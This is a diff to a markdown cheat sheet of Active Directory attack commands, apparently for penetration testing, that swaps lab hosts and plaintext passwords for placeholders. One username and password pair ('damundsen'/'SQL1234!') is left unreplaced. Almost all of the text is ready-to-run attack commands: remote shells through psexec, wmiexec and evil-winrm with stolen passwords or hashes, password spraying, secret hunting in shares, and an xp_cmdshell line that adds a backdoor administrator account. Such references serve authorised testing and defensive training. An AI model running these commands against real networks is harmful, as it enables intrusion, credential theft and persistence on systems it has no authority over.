@@ -303,7 +303,7 @@ powercat -l -v -p 443 -t 1000
 - **Context:** Have valid credentials with local admin — creates a Windows service
 - **Payload/Method:**
   ```bash
-  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+  psexec.py domain.local/<USER>:'<TARGET_PASSWORD>'@<TARGET_IP>
   ```
 
 ### wmiexec.py — Shell via WMI (Semi-Interactive, Less Noisy) [added: 2026-04]
@@ -315,7 +315,7 @@ powercat -l -v -p 443 -t 1000
 - **Context:** Valid credentials with WMI access — does NOT create service
 - **Payload/Method:**
   ```bash
-  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+  wmiexec.py domain.local/<USER>:'<TARGET_PASSWORD>'@<DC_IP>
   ```
 
 ### evil-winrm — PowerShell Remoting (Port 5985/5986) [added: 2026-04]
@@ -327,9 +327,9 @@ powercat -l -v -p 443 -t 1000
 - **Context:** Target has WinRM enabled and user is in "Remote Management Users"
 - **Payload/Method:**
   ```bash
-  evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
+  evil-winrm -i <TARGET_IP> -u <USER> -p '<TARGET_PASSWORD>'
   # With hash
-  evil-winrm -i 10.129.201.234 -u forend -H <NTLM-hash>
+  evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM-hash>
   ```
 
 ### Enter-PSSession (Windows to Windows) [added: 2026-04]
@@ -341,8 +341,8 @@ powercat -l -v -p 443 -t 1000
 - **Context:** From Windows — PowerShell remoting
 - **Payload/Method:**
   ```powershell
-  $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
-  $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\forend", $password)
+  $password = ConvertTo-SecureString '"<TARGET_PASSWORD>"' -AsPlainText -Force
+  $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\<USER>", $password)
   Enter-PSSession -ComputerName TARGET-PC -Credential $cred
   ```
 
@@ -358,17 +358,17 @@ powercat -l -v -p 443 -t 1000
 - **Payload/Method:**
   ```bash
   # From Linux (Impacket)
-  mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+  mssqlclient.py DOMAIN/USER@<TARGET_IP> -windows-auth
 
   # In mssqlclient shell:
   SQL> enable_xp_cmdshell
   SQL> xp_cmdshell whoami /priv
-  SQL> xp_cmdshell net user hacker Password123 /add && net localgroup administrators hacker /add
+  SQL> xp_cmdshell net user hacker <TARGET_PASSWORD> /add && net localgroup administrators hacker /add
   ```
   ```powershell
   # PowerUpSQL from Windows
   Get-SQLInstanceDomain  # discover MSSQL instances
-  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" \
+  Get-SQLQuery -Verbose -Instance "<TARGET_IP>,1433" \
     -username "DOMAIN\damundsen" -password "SQL1234!" \
     -query 'Select @@version'
   ```
@@ -421,16 +421,16 @@ powercat -l -v -p 443 -t 1000
 - **Payload/Method:**
   ```bash
   # Spray domain
-  sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+  sudo crackmapexec smb <DC_IP> -u valid_users.txt -p <TARGET_PASSWORD> | grep +
 
   # Local auth spray across subnet (--local-auth to limit to 1 attempt per host)
-  sudo crackmapexec smb --local-auth 172.16.5.0/24 \
+  sudo crackmapexec smb --local-auth <TARGET_SUBNET>/24 \
     -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
   # Check password policy before spraying
-  crackmapexec smb 172.16.5.5 -u user -p pass --pass-pol
-  rpcclient -U "" -N 172.16.5.5 -c "querydominfo"  # null session
-  enum4linux -P 172.16.5.5
+  crackmapexec smb <DC_IP> -u user -p pass --pass-pol
+  rpcclient -U "" -N <DC_IP> -c "querydominfo"  # null session
+  enum4linux -P <DC_IP>
   ```
 
 ### Kerbrute Password Spray (No LDAP, Kerberos-Based — Quieter) [added: 2026-04]
@@ -442,7 +442,7 @@ powercat -l -v -p 443 -t 1000
 - **Context:** Kerberos-based spray — avoids SMB login events
 - **Payload/Method:**
   ```bash
-  kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+  kerbrute passwordspray -d domain.local --dc <DC_IP> valid_users.txt <TARGET_PASSWORD>
   ```
 
 ### rpcclient Spray (Bash Loop) [added: 2026-04]
@@ -455,7 +455,7 @@ powercat -l -v -p 443 -t 1000
 - **Payload/Method:**
   ```bash
   for u in $(cat valid_users.txt); do
-    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
+    rpcclient -U "$u%<TARGET_PASSWORD>" -c "getusername;quit" <DC_IP> | grep Authority
   done
   ```
 
@@ -470,8 +470,8 @@ powercat -l -v -p 443 -t 1000
 - **Context:** Authenticated — collect all AD objects to visualize attack paths
 - **Payload/Method:**
   ```bash
-  sudo bloodhound-python -u 'forend' -p 'Klmcargo2' \
-    -ns 172.16.5.5 -d inlanefreight.local -c all
+  sudo bloodhound-python -u '<USER>' -p '<TARGET_PASSWORD>' \
+    -ns <DC_IP> -d domain.local -c all
 
   zip -r domain_bh.zip *.json
   # Upload zip to BloodHound GUI
@@ -488,7 +488,7 @@ powercat -l -v -p 443 -t 1000
 - **Context:** On a Windows host — finds passwords, certs, configs in readable shares
 - **Payload/Method:**
   ```powershell
-  .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+  .\Snaffler.exe -d DOMAIN.LOCAL -s -v data
   # -s = print to screen, -v data = show data matches
   ```
 
@@ -496,24 +496,24 @@ powercat -l -v -p 443 -t 1000
 
 ```bash
 # Enumerate users, groups, logged-on users, shares
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
-crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+crackmapexec smb <DC_IP> -u <USER> -p <TARGET_PASSWORD> --users
+crackmapexec smb <DC_IP> -u <USER> -p <TARGET_PASSWORD> --groups
+crackmapexec smb <TARGET_IP> -u <USER> -p <TARGET_PASSWORD> --loggedon-users
+crackmapexec smb <DC_IP> -u <USER> -p <TARGET_PASSWORD> --shares
 
 # Spider shares for interesting files
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
+crackmapexec smb <DC_IP> -u <USER> -p <TARGET_PASSWORD> -M spider_plus --share Dev-share
 
 # SMBMap with recursive SYSVOL listing
-smbmap -u forend -p Klmcargo2 -d DOMAIN.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
+smbmap -u <USER> -p <TARGET_PASSWORD> -d DOMAIN.LOCAL -H <DC_IP> -R SYSVOL --dir-only
 ```
 
 ## AD DNS Zone Dump (adidnsdump)
 - **Context:** Authenticated — dump all DNS records including internal hosts not in standard enum
 - **Payload/Method:**
   ```bash
-  adidnsdump -u DOMAIN\\forend ldap://172.16.5.5
-  adidnsdump -u DOMAIN\\forend ldap://172.16.5.5 -r  # resolve unknown records via A query
+  adidnsdump -u DOMAIN\\<USER> ldap://<DC_IP>
+  adidnsdump -u DOMAIN\\<USER> ldap://<DC_IP> -r  # resolve unknown records via A query
   ```
 
 ### SSH Key Planting via SMB Write Access [added: 2026-04]
